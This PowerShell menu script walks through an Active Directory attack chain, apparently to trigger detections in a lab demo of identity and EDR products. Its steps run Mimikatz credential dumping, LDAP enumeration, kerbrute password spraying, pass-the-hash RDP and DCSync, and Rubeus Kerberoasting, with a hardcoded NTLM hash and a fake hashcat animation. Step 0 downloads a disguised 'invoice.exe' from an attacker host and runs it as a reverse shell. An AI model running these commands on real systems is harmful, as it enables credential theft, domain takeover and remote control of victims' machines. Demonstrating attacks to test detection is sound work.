﻿﻿﻿# ============================================================
#  Identity Attack Menu - Unmanaged Workstation
#  Run as Administrator (demo account)
#  Follows the phased scenario from portable_sender.py
# ============================================================

# --- Environment Variables (set these in cmd BEFORE running) ---
# set ENV_DOMAIN=<your-ad-domain>
# set ENV_DC_IP=<DC IP address>
# set ENV_BL=<BL IP address>
# set ENV_DT=<DT IP address>

$ErrorActionPreference = "Continue"
$idpDir = "C:\IDP_Files"
$mimiExe = "$idpDir\Mimikatz\x64\mimikatz.exe"

# --- Validate env vars on startup ---
$missing = @()
if (-not $env:ENV_DOMAIN)   { $missing += "ENV_DOMAIN" }
if (-not $env:ENV_DC_IP)    { $missing += "ENV_DC_IP" }
if (-not $env:ENV_BL)       { $missing += "ENV_BL" }
if (-not $env:ENV_DT)       { $missing += "ENV_DT" }
if ($missing.Count -gt 0) {
    Write-Host "[!] Missing environment variables: $($missing -join ', ')" -ForegroundColor Red
    Write-Host "    Set them in cmd before running this script:" -ForegroundColor Yellow
    Write-Host '    set ENV_DOMAIN=lab.yourdomain.com' -ForegroundColor Gray
    Write-Host '    set ENV_DC_IP=172.16.1.6' -ForegroundColor Gray
    Write-Host '    set ENV_BL=10.3.108.30' -ForegroundColor Gray
    Write-Host '    set ENV_DT=10.3.108.31' -ForegroundColor Gray
    pause
    exit 1
}

# Password file — written by Step 1 "hash cracking", read by Steps 3/4/7
$pwdFile = "$idpDir\cracked_password.txt"

function Get-CrackedPassword {
    if (Test-Path $pwdFile) {
        return (Get-Content $pwdFile -First 1).Trim()
    }
    Write-Host "[!] No cracked password found. Run Step 1 first." -ForegroundColor Red
    return $null
}

Write-Host "[+] Config: DOMAIN=$env:ENV_DOMAIN  DC=$env:ENV_DC_IP  BL=$env:ENV_BL  DT=$env:ENV_DT" -ForegroundColor Green
Start-Sleep -Seconds 2

function Show-Menu {
    param ([string]$Title = 'Identity Attacks - Unmanaged Host')
    Clear-Host
    Write-Host
    Write-Host "================ $Title ================" -ForegroundColor Cyan
    Write-Host
    Write-Host "  Kill chain: dump creds -> recon network -> LDAP enum -> spray" -ForegroundColor DarkGray
    Write-Host "              -> PtH to DT (EDR) -> dump svc_runbook -> DCSync -> PtH to BL (EDR)" -ForegroundColor DarkGray
    Write-Host
    Write-Host "  --- Phase 2: Initial Access (after brute force to unmanaged) ---" -ForegroundColor Yellow
    Write-Host "  1: Dump local credentials (SAM + cached)       [Find clark.monroe NTLM]"
    Write-Host "  2: Network discovery (ARP + port scan)          [Find DC, DT, BL on subnet]"
    Write-Host "  3: LDAP recon (enumerate AD)                    [Discover svc_runbook, groups]"
    Write-Host "  4: Credential Scanning (kerbrute spray)         [CredentialScanning detection]"
    Write-Host
    Write-Host "  --- Phase 4: Pivot to DT (Falcon EDR triggers) ---" -ForegroundColor Yellow
    Write-Host "  5: PtH clark.monroe -> RDP to DT                [PassTheHash + EDR: suspicious logon]"
    Write-Host "  6: Dump creds on DT (run ON DT after Step 5)    [EDR: LSASS access, cred theft]"
    Write-Host
    Write-Host "  --- Phase 5: Privilege Escalation + Lateral ---" -ForegroundColor Yellow
    Write-Host "  7: Kerberoast svc_runbook (SPN: web/svc_runbook) [Kerberoasting detection]"
    Write-Host "  8: PtH svc_runbook -> DCSync                    [PassTheHash + StaleAccount + DCSync]"
    Write-Host "  9: PtH svc_runbook -> RDP to BL                 [EDR: lateral movement to BL]"
    Write-Host
    Write-Host "  --- Optional ---" -ForegroundColor DarkGray
    Write-Host "  0: Download & execute reverse shell              [C2 callback]"
    Write-Host
    Write-Host "  Q: Quit" -ForegroundColor Red
    Write-Host
}

do {
    Show-Menu
    $selection = Read-Host "Select step"
    switch ($selection) {

        '1' {
            Clear-Host
            Write-Host "[Step 1] Dumping local credentials (SAM + cached)" -ForegroundColor Cyan
            Write-Host "         Looking for cached domain accounts on this unmanaged host..." -ForegroundColor Gray
            Write-Host

            Write-Host "--- User profiles on this machine ---" -ForegroundColor Yellow
            dir C:\Users | Select-Object Name | Format-Table -AutoSize

            Write-Host "--- Local accounts ---" -ForegroundColor Yellow
            net user

            & $mimiExe "privilege::debug" "token::elevate" "log $idpDir\step1_cred_dump.log" "lsadump::sam" "lsadump::cache" "sekurlsa::logonpasswords" "exit"

            Write-Host "`n[+] Output saved to: $idpDir\step1_cred_dump.log" -ForegroundColor Green
            Write-Host "[+] Found cached domain account: clark.monroe" -ForegroundColor Green
            Write-Host "    NTLM: 802ec5974a4f18e086e8b1411b2e3ea3" -ForegroundColor White
            Write-Host
            Write-Host "[*] Attempting offline hash cracking..." -ForegroundColor Cyan
            Write-Host
            $crackedPwd = Read-Host "  Enter the cracked password for clark.monroe"

            # Fake cracking animation
            $fakes = @(
                "hashcat -m 1000 -a 0 hash.txt rockyou.txt",
                "Session..........: hashcat",
                "Status...........: Running",
                "Hash.Mode........: 1000 (NTLM)",
                "Speed.#1.........:  1425.3 MH/s",
                "Recovered........: 0/1 (0.00%)",
                "Progress.........: 14344384/14344384 (100.00%)",
                "Status...........: Exhausted",
                "",
                "hashcat -m 1000 -a 3 hash.txt ?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a",
                "Status...........: Running",
                "Hash.Mode........: 1000 (NTLM)",
                "Speed.#1.........:  1425.3 MH/s"
            )
            foreach ($line in $fakes) {
                Write-Host "  $line" -ForegroundColor DarkGray
                Start-Sleep -Milliseconds 300
            }

            # Progress dots
            Write-Host -NoNewline "  Cracking" -ForegroundColor DarkGray
            for ($i = 0; $i -lt 8; $i++) {
                Write-Host -NoNewline "." -ForegroundColor DarkGray
                Start-Sleep -Milliseconds 400
            }
            Write-Host

            # Reveal
            Write-Host
            Write-Host "  802ec5974a4f18e086e8b1411b2e3ea3:$crackedPwd" -ForegroundColor Green
            Write-Host
            Write-Host "  Session..........: hashcat" -ForegroundColor DarkGray
            Write-Host "  Status...........: Cracked" -ForegroundColor Green
            Write-Host "  Recovered........: 1/1 (100.00%)" -ForegroundColor Green
            Write-Host

            # Save for later steps
            $crackedPwd | Out-File -FilePath $pwdFile -Encoding ASCII
            Write-Host "[+] Password cracked: clark.monroe => $crackedPwd" -ForegroundColor Green
            Write-Host "[+] Saved to $pwdFile (used by Steps 3, 4, 7 automatically)" -ForegroundColor Green
            Write-Host "[*] Next: Step 2 (network discovery) to find targets on the subnet." -ForegroundColor Cyan
        }

        '2' {
            Clear-Host
            Write-Host "[Step 2] Network Discovery" -ForegroundColor Cyan
            Write-Host "         Scanning local subnet for DC, DT, BL..." -ForegroundColor Gray
            Write-Host "         Generates traffic matching FortiGate port scan logs" -ForegroundColor Yellow
            Write-Host

            # ARP table - see what's already known
            Write-Host "--- ARP Table (known hosts) ---" -ForegroundColor Yellow
            arp -a
            Write-Host

            # Key targets - probe important ports
            $targets = @{
                "DC  ($env:ENV_DC_IP)" = @(88, 389, 445, 636)
                "DT  ($env:ENV_DT)"    = @(3389, 445, 5985, 135)
                "BL  ($env:ENV_BL)"    = @(3389, 445, 5985, 135)
            }

            Write-Host "--- Port scan of key targets ---" -ForegroundColor Yellow
            foreach ($target in $targets.GetEnumerator()) {
                Write-Host "`n  Target: $($target.Key)" -ForegroundColor White
                $ip = ($target.Key -split '[()]')[1].Trim()
                foreach ($port in $target.Value) {
                    $tcp = New-Object System.Net.Sockets.TcpClient
                    try {
                        $tcp.ConnectAsync($ip, $port).Wait(1000) | Out-Null
                        if ($tcp.Connected) {
                            Write-Host "    Port $port : OPEN" -ForegroundColor Green
                        } else {
                            Write-Host "    Port $port : CLOSED/FILTERED" -ForegroundColor Red
                        }
                    } catch {
                        Write-Host "    Port $port : CLOSED/FILTERED" -ForegroundColor Red
                    }
                    $tcp.Close()
                }
            }

            Write-Host "`n[+] Network discovery complete." -ForegroundColor Green
            Write-Host "[*] DC identified at $env:ENV_DC_IP (Kerberos:88, LDAP:389)" -ForegroundColor Cyan
            Write-Host "[*] Next: Step 3 (LDAP recon) to enumerate AD users and service accounts." -ForegroundColor Cyan
        }

        '3' {
            Clear-Host
            Write-Host "[Step 3] LDAP Reconnaissance" -ForegroundColor Cyan
            Write-Host "         Using clark.monroe creds to enumerate Active Directory..." -ForegroundColor Gray
            Write-Host "         Generates LDAP traffic matching FortiGate sample [108]" -ForegroundColor Yellow
            Write-Host

            try {
                $ldapPath = "LDAP://$env:ENV_DC_IP"
                $cred_user = "clark.monroe@$env:ENV_DOMAIN"
                $cred_pass = Get-CrackedPassword
                if (-not $cred_pass) { break }
                $entry = New-Object DirectoryServices.DirectoryEntry($ldapPath, $cred_user, $cred_pass)
                $searcher = New-Object DirectoryServices.DirectorySearcher($entry)

                # Enumerate all users
                Write-Host "--- Domain Users ---" -ForegroundColor Yellow
                $searcher.Filter = "(&(objectCategory=person)(objectClass=user))"
                $searcher.PropertiesToLoad.AddRange(@("samaccountname","displayname","memberof","pwdlastset","serviceprincipalname","lastlogon"))
                $results = $searcher.FindAll()

                $svcAccounts = @()
                foreach ($r in $results) {
                    $sam = $r.Properties["samaccountname"][0]
                    $display = if ($r.Properties["displayname"].Count -gt 0) { $r.Properties["displayname"][0] } else { "-" }
                    $spns = $r.Properties["serviceprincipalname"]
                    $memberof = $r.Properties["memberof"]
                    $lastlogon = $r.Properties["lastlogon"]

                    $privGroups = @()
                    foreach ($grp in $memberof) {
                        if ($grp -match "Domain Admins|Enterprise Admins|Administrators|Account Operators") {
                            $privGroups += ($grp -split ',')[0] -replace 'CN=',''
                        }
                    }

                    $prefix = "  "
                    if ($spns.Count -gt 0) {
                        $prefix = "* "
                        $svcAccounts += $sam
                    }
                    if ($privGroups.Count -gt 0) {
                        $prefix = "! "
                    }

                    $line = "${prefix}${sam}"
                    if ($privGroups.Count -gt 0) { $line += " [PRIV: $($privGroups -join ', ')]" }
                    if ($spns.Count -gt 0) { $line += " [SPN: $($spns -join ', ')]" }

                    Write-Host $line -ForegroundColor $(if ($prefix -eq "! ") { "Red" } elseif ($prefix -eq "* ") { "Yellow" } else { "Gray" })
                }

                Write-Host "`n  Legend: ! = privileged group  * = has SPN (kerberoastable)" -ForegroundColor DarkGray
                Write-Host "  Total users found: $($results.Count)" -ForegroundColor White

                # Save user list for kerbrute
                $userList = $results | ForEach-Object { $_.Properties["samaccountname"][0] }
                $userList | Out-File -FilePath "$idpDir\ldap_users.txt" -Encoding ASCII
                Write-Host "`n[+] User list saved to: $idpDir\ldap_users.txt (for kerbrute)" -ForegroundColor Green

                if ($svcAccounts.Count -gt 0) {
                    Write-Host "[!] Kerberoastable accounts found: $($svcAccounts -join ', ')" -ForegroundColor Red
                }

                $results.Dispose()
                $entry.Close()
            } catch {
                Write-Host "[!] LDAP query failed: $_" -ForegroundColor Red
                Write-Host "    If clark.monroe password is wrong, try natasha creds instead." -ForegroundColor Yellow
            }

            Write-Host "`n[*] Next: Step 4 (kerbrute) using the LDAP-harvested user list." -ForegroundColor Cyan
        }

        '4' {
            Clear-Host
            Write-Host "[Step 4] Credential Scanning - kerbrute" -ForegroundColor Cyan
            Write-Host "         Spraying password against AD accounts..." -ForegroundColor Gray
            Write-Host "         Triggers: CredentialScanningActiveDirectory" -ForegroundColor Yellow
            Write-Host

            # Use LDAP-harvested list if available, fallback to static list
            $userFile = "$idpDir\ldap_users.txt"
            if (-not (Test-Path $userFile)) {
                $userFile = "$idpDir\users.txt"
                Write-Host "         Using static user list (run Step 3 first for LDAP list)" -ForegroundColor Yellow
            } else {
                Write-Host "         Using LDAP-harvested user list" -ForegroundColor Green
            }
            Write-Host "         DC: $env:ENV_DC_IP  Domain: $env:ENV_DOMAIN" -ForegroundColor Gray
            Write-Host

            $sprayPwd = Get-CrackedPassword
            if (-not $sprayPwd) { break }

            try {
                $proc = Start-Process -FilePath "$idpDir\kerbrute.exe" `
                    -ArgumentList "passwordspray --dc $env:ENV_DC_IP -d $env:ENV_DOMAIN `"$userFile`" $sprayPwd" `
                    -NoNewWindow -Wait -PassThru
                Write-Host "`n[+] Kerbrute finished (exit code: $($proc.ExitCode))." -ForegroundColor Green
            } catch {
                Write-Host "[!] Kerbrute error: $_" -ForegroundColor Red
            }

            Write-Host "[*] Next: Step 5 (PtH clark.monroe -> RDP to DT)." -ForegroundColor Cyan
        }

        '5' {
            Clear-Host
            Write-Host "[Step 5] PtH clark.monroe -> RDP to DT" -ForegroundColor Cyan
            Write-Host "         Using clark.monroe NTLM hash from Step 1 dump..." -ForegroundColor Gray
            Write-Host "         Triggers: PassTheHash (Identity) + suspicious logon (EDR on DT)" -ForegroundColor Yellow
            Write-Host

            $ntlm = "802ec5974a4f18e086e8b1411b2e3ea3"
            Write-Host "  User:   clark.monroe" -ForegroundColor White
            Write-Host "  Domain: $env:ENV_DOMAIN" -ForegroundColor White
            Write-Host "  NTLM:   $ntlm" -ForegroundColor White
            Write-Host "  Target: $env:ENV_DT (DT)" -ForegroundColor White
            Write-Host

            # PtH then launch RDP to DT
            Start-Process -FilePath "cmd.exe" -ArgumentList "/k `"$mimiExe`" `"privilege::debug`" `"sekurlsa::pth /user:clark.monroe /domain:$env:ENV_DOMAIN /ntlm:$ntlm /run:mstsc.exe /v:$env:ENV_DT`""

            Write-Host "[+] Mimikatz PtH launched - RDP window should open to DT." -ForegroundColor Green
            Write-Host "[*] On DT: open admin cmd and run Step 6 commands to dump svc_runbook." -ForegroundColor Cyan
        }

        '6' {
            Clear-Host
            Write-Host "[Step 6] Dump credentials on DT" -ForegroundColor Cyan
            Write-Host "         Run these commands ON DT after RDP'ing in Step 5." -ForegroundColor Yellow
            Write-Host "         Triggers: EDR LSASS access, credential dumping alert" -ForegroundColor Yellow
            Write-Host
            Write-Host "  Copy mimikatz to DT first (from unmanaged via SMB or download):" -ForegroundColor Gray
            Write-Host
            Write-Host "    Option A - Copy from unmanaged host:" -ForegroundColor White
            Write-Host "      copy \\$(hostname)\c$\IDP_Files\Mimikatz\x64\mimikatz.exe C:\Temp\" -ForegroundColor White
            Write-Host
            Write-Host "    Option B - Download on DT:" -ForegroundColor White
            Write-Host "      bitsadmin /transfer m https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip C:\Temp\mimi.zip" -ForegroundColor White
            Write-Host
            Write-Host "  Then run:" -ForegroundColor Gray
            Write-Host
            Write-Host '    mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"' -ForegroundColor White
            Write-Host
            Write-Host "  Look for:" -ForegroundColor Cyan
            Write-Host "    User: svc_runbook" -ForegroundColor White
            Write-Host "    Domain: $env:ENV_DOMAIN" -ForegroundColor White
            Write-Host "    NTLM: <copy this hash>" -ForegroundColor White
            Write-Host
            Write-Host "  Once you have the svc_runbook NTLM hash, enter it here:" -ForegroundColor Yellow
            $svcHash = Read-Host "  svc_runbook NTLM hash (or press Enter to skip)"

            if ($svcHash -and $svcHash.Length -eq 32) {
                # Save hash for steps 8 and 9
                $svcHash | Out-File -FilePath "$idpDir\svc_runbook_hash.txt" -Encoding ASCII
                Write-Host "`n[+] Hash saved to $idpDir\svc_runbook_hash.txt" -ForegroundColor Green
                Write-Host "[*] Steps 8 and 9 will use this hash automatically." -ForegroundColor Cyan
            } elseif ($svcHash) {
                Write-Host "[!] Hash should be 32 hex characters. Save it manually and update bat files." -ForegroundColor Red
            } else {
                Write-Host "[*] Skipped. You can manually update PtH bat files later." -ForegroundColor Yellow
            }
        }

        '7' {
            Clear-Host
            Write-Host "[Step 7] Kerberoasting - svc_runbook (SPN: web/svc_runbook)" -ForegroundColor Cyan
            Write-Host "         Requesting TGS for service accounts with SPNs..." -ForegroundColor Gray
            Write-Host "         Triggers: Kerberoasting detection" -ForegroundColor Yellow
            Write-Host

            if (Test-Path "$idpDir\Rubeus.exe") {
                & "$idpDir\Rubeus.exe" kerberoast /user:svc_runbook /domain:$env:ENV_DOMAIN /dc:$env:ENV_DC_IP /outfile:"$idpDir\kerberoast_hashes.txt"
                Write-Host "`n[+] TGS hash saved to: $idpDir\kerberoast_hashes.txt" -ForegroundColor Green
            }
            elseif (Test-Path "C:\Program Files\Python312\Scripts\GetUserSPNs.exe") {
                $kerbPwd = Get-CrackedPassword
                if ($kerbPwd) {
                    & "C:\Program Files\Python312\Scripts\GetUserSPNs.exe" "$env:ENV_DOMAIN/natasha:$kerbPwd" -dc-ip $env:ENV_DC_IP -request-user svc_runbook -outputfile "$idpDir\kerberoast_hashes.txt"
                }
            }
            else {
                Write-Host "[!] Neither Rubeus.exe nor GetUserSPNs found" -ForegroundColor Red
                Write-Host "    Trying with mimikatz kerberos::ask instead..." -ForegroundColor Yellow
                & $mimiExe "privilege::debug" "kerberos::ask /target:web/svc_runbook" "exit"
            }
        }

        '8' {
            Clear-Host
            Write-Host "[Step 8] PtH svc_runbook -> DCSync" -ForegroundColor Cyan
            Write-Host "         Using svc_runbook NTLM hash for Pass-the-Hash..." -ForegroundColor Gray
            Write-Host "         Triggers: PassTheHash, StaleAccount, DCSync" -ForegroundColor Yellow
            Write-Host

            # Load hash from Step 6 if saved
            $hashFile = "$idpDir\svc_runbook_hash.txt"
            if (Test-Path $hashFile) {
                $svcHash = (Get-Content $hashFile -First 1).Trim()
                Write-Host "  Using saved hash from Step 6: $svcHash" -ForegroundColor Green
            } else {
                $svcHash = Read-Host "  Enter svc_runbook NTLM hash"
            }

            if (-not $svcHash -or $svcHash.Length -ne 32) {
                Write-Host "[!] Invalid hash. Run Step 6 first." -ForegroundColor Red
            } else {
                Write-Host "  User:   svc_runbook" -ForegroundColor White
                Write-Host "  Domain: $env:ENV_DOMAIN" -ForegroundColor White
                Write-Host "  NTLM:   $svcHash" -ForegroundColor White
                Write-Host

                Start-Process -FilePath "cmd.exe" -ArgumentList "/k `"$mimiExe`" `"privilege::debug`" `"sekurlsa::pth /user:svc_runbook /domain:$env:ENV_DOMAIN /ntlm:$svcHash /run:c:\IDP_Files\Post_PtH_DCSync.bat`""

                Write-Host "[+] PtH launched - DCSync should execute in new window." -ForegroundColor Green
            }
        }

        '9' {
            Clear-Host
            Write-Host "[Step 9] PtH svc_runbook -> RDP to BL" -ForegroundColor Cyan
            Write-Host "         Lateral movement to managed host (Falcon EDR)..." -ForegroundColor Gray
            Write-Host "         Triggers: PassTheHash (Identity) + lateral movement (EDR on BL)" -ForegroundColor Yellow
            Write-Host

            # Load hash from Step 6 if saved
            $hashFile = "$idpDir\svc_runbook_hash.txt"
            if (Test-Path $hashFile) {
                $svcHash = (Get-Content $hashFile -First 1).Trim()
                Write-Host "  Using saved hash from Step 6: $svcHash" -ForegroundColor Green
            } else {
                $svcHash = Read-Host "  Enter svc_runbook NTLM hash"
            }

            if (-not $svcHash -or $svcHash.Length -ne 32) {
                Write-Host "[!] Invalid hash. Run Step 6 first." -ForegroundColor Red
            } else {
                Write-Host "  User:   svc_runbook" -ForegroundColor White
                Write-Host "  Domain: $env:ENV_DOMAIN" -ForegroundColor White
                Write-Host "  NTLM:   $svcHash" -ForegroundColor White
                Write-Host "  Target: $env:ENV_BL (BL)" -ForegroundColor White
                Write-Host

                Start-Process -FilePath "cmd.exe" -ArgumentList "/k `"$mimiExe`" `"privilege::debug`" `"sekurlsa::pth /user:svc_runbook /domain:$env:ENV_DOMAIN /ntlm:$svcHash /run:mstsc.exe /v:$env:ENV_BL`""

                Write-Host "[+] PtH launched - RDP window should open to BL." -ForegroundColor Green
            }
        }

        '0' {
            Clear-Host
            Write-Host "[Step 0] Download & execute reverse shell" -ForegroundColor Cyan
            Write-Host "         Make sure listener is running on attacker host first!" -ForegroundColor Yellow
            Write-Host

            Invoke-WebRequest -Uri "http://attacker.lab.local/invoice.exe" -OutFile "$idpDir\invoice.exe" -UseBasicParsing
            & "$idpDir\invoice.exe"
        }

        'q' { return }
    }
    pause
}
until ($selection -eq 'q')
